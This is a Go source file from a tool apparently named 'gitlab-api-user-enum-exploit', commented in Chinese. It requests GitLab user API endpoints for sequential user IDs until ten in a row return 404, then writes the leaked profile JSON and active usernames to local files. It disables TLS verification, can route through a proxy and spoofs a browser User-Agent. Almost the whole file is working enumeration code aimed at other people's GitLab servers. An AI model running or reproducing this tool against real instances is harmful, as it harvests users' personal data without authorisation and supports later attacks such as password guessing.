package core

import (
	"crypto/tls"
	"fmt"
	"github.com/bitly/go-simplejson"
	"github.com/fatih/color"
	"github.com/go-resty/resty/v2"
	"gitlab-api-user-enum-exploit/pkg/config"
	"gitlab-api-user-enum-exploit/pkg/file_util"
	"net/http"
	"path/filepath"
	"strconv"
)

type GitlabUserEnum struct {
	config *config.Config

	requestClient *RequestClient

	// 用于记录遇到连续多少个404了
	continueNotFoundCount int

	// 是否已经结束
	isFinished bool

	// 总共检测了多少次
	totalDetectCount int

	// 发现了多少个存在的用户
	existsUserCount int
}

func NewGitlabUserEnum(config *config.Config) *GitlabUserEnum {
	return &GitlabUserEnum{
		config:        config,
		requestClient: NewRequestClient(config),
	}
}

func (x *GitlabUserEnum) Init() error {
	// 初始化一些东西

	// 输出文件所在的目录可能还不存在，如果不存在的话就创建
	if x.config.OutputJsonLineFile != "" {
		if file_util.Exists(x.config.OutputJsonLineFile) {
			return fmt.Errorf("文件%s已经存在", x.config.OutputJsonLineFile)
		}
		base := filepath.Dir(x.config.OutputJsonLineFile)
		if err := file_util.EnsureDirectoryExists(base); err != nil {
			return err
		}
	}

	if x.config.OutputUsernameFile != "" {
		if file_util.Exists(x.config.OutputUsernameFile) {
			return fmt.Errorf("文件%s已经存在", x.config.OutputUsernameFile)
		}
		base := filepath.Dir(x.config.OutputUsernameFile)
		if err := file_util.EnsureDirectoryExists(base); err != nil {
			return err
		}
	}

	return nil
}

func (x *GitlabUserEnum) Run() {
	for userId := 1; !x.isFinished; userId++ {
		userInfoJsonObject, err := x.getProfileByUserID(userId)
		if err != nil {
			color.Red(err.Error())
			return
		}
		if userInfoJsonObject != nil {
			x.saveUserInfo(userId, userInfoJsonObject)
		}
	}

	// 打印一些总结性的信息
	x.showResultOverview()
}

// 根据指定的用户ID获取泄露的信息
func (x *GitlabUserEnum) getProfileByUserID(userId int) (*simplejson.Json, error) {
	x.totalDetectCount++

	targetUrl := x.config.ApiUrl + strconv.Itoa(userId)
	tryTimes := 0
	for {
		tryTimes++

		color.BlackString("UserID: %d，用户信息API地址: %s，即将发起请求...", targetUrl)
		response, err := x.requestClient.Request(targetUrl)
		if err != nil {
			color.Red("UserID: %d，请求时发生了错误：%s", userId, err.Error())
			if tryTimes > x.config.RequestMaxTryTimes {
				return nil, fmt.Errorf("UserID: %d, 用户信息请求失败，重试次数已用尽，放弃！", userId)
			} else {
				color.Red("UserID: %d，用户信息请求失败，当前重试次数：%d, 继续重试...", userId, tryTimes)
				continue
			}
		}

		// 判断是否是存在的用户
		responseString := string(response.Body())
		responseJsonObject, err := simplejson.NewJson(response.Body())
		if err != nil {
			color.Red("UserID = %d， 响应内容不是有效的JSON：%s, 错误信息: %s", userId, responseString, err.Error())
			// TODO show retry info for user
			continue
		}
		if x.isUserNotFound(response, responseJsonObject) {
			color.Red("UserID: %d，用户不存在，忽略。", userId)
			if x.continueNotFoundCount++; x.continueNotFoundCount > 10 {
				x.isFinished = true
			}
			return nil, nil
		} else {
			color.Green("UserID: %d，已经获取到用户信息： %s", userId, responseString)
			x.continueNotFoundCount = 0
			x.existsUserCount++
			return responseJsonObject, nil
		}
	}
}

// 将拿到的用户信息保存到本地
func (x *GitlabUserEnum) saveUserInfo(userId int, userInfo *simplejson.Json) {

	// 用户的完整信息保存
	if x.config.OutputJsonLineFile != "" {
		jsonBytes, err := userInfo.MarshalJSON()
		if err != nil {
			color.Red("UserID: %d, 获取到的信息序列化为字符串时发生了错误: %s", userId, err.Error())
		} else {
			if err = file_util.AppendLine(x.config.OutputJsonLineFile, string(jsonBytes)); err != nil {
				color.Red("UserID: %s, 保存用户信息到%s时发生了错误: %s", userId, x.config.OutputJsonLineFile, err.Error())
			}
		}
	}

	// 只是保存用户名
	if x.config.OutputUsernameFile != "" {
		state, _ := userInfo.Get("state").String()
		if state != "active" {
			return
		}
		username, err := userInfo.Get("username").String()
		if err != nil {
			color.Red("UserID: %d, 获取用户名时发生错误: %s", userId, err.Error())
			return
		}
		if err = file_util.AppendLine(x.config.OutputUsernameFile, username); err != nil {
			color.Red("UserID: %d, 保存用户名到%s时发生了错误: %s", userId, x.config.OutputUsernameFile, err.Error())
		}
	}
}

// 任务结束后展示一些任务结果相关的概览信息，让其瞟一眼就能大概有个数
func (x *GitlabUserEnum) showResultOverview() {
	if x.existsUserCount > 0 {

		color.Green("任务已结束，总共探测了%d个用户ID，拿到了%d个用户的信息", x.totalDetectCount, x.existsUserCount)

		if x.config.OutputJsonLineFile != "" {
			color.Green("用户信息的JSON响应已经保存到: %s", x.config.OutputJsonLineFile)
		}

		if x.config.OutputUsernameFile != "" {
			color.Green("用户名已经保存到文件: %s", x.config.OutputUsernameFile)
		}

	} else {
		color.Red("任务已结束，总共探测了%d个用户ID， 很遗憾，没有拿到有效的用户信息。", x.totalDetectCount)
	}
}

// 判断响应内容是不是404，一个返回是404的例子： {"message":"404 User Not Found"}
func (x *GitlabUserEnum) isUserNotFound(response *resty.Response, responseJsonObject *simplejson.Json) bool {
	if response.StatusCode() == 404 {
		return true
	}
	if s, _ := responseJsonObject.Get("message").String(); s == "404 User Not Found" {
		return true
	}
	return false
}

// RequestClient 用于封装发送网络相关的逻辑
type RequestClient struct {
	client *resty.Client
	config *config.Config
}

func NewRequestClient(config *config.Config) *RequestClient {
	client := resty.New()
	if config.Proxy != "" {
		client.SetProxy(config.Proxy)
		color.Green("设置请求时使用代理: %s", config.Proxy)
	}
	client.SetTransport(&http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	})
	return &RequestClient{
		client: client,
		config: config,
	}
}

// Request 根据配置构造请求并发送
func (x *RequestClient) Request(targetUrl string) (*resty.Response, error) {
	request := x.client.R()

	// 一些默认的请求头
	request.SetHeader("Accept", "application/json, text/plain, */*")
	request.SetHeader("Accept-Encoding", "gzip, deflate")
	request.SetHeader("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7")
	request.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36")

	// 执行并返回结果
	return request.Get(targetUrl)
}

// 判断是否是网络不通的错误
func (x *RequestClient) isNetworkDisconnection(err error) bool {
	// TODO
	return false
}
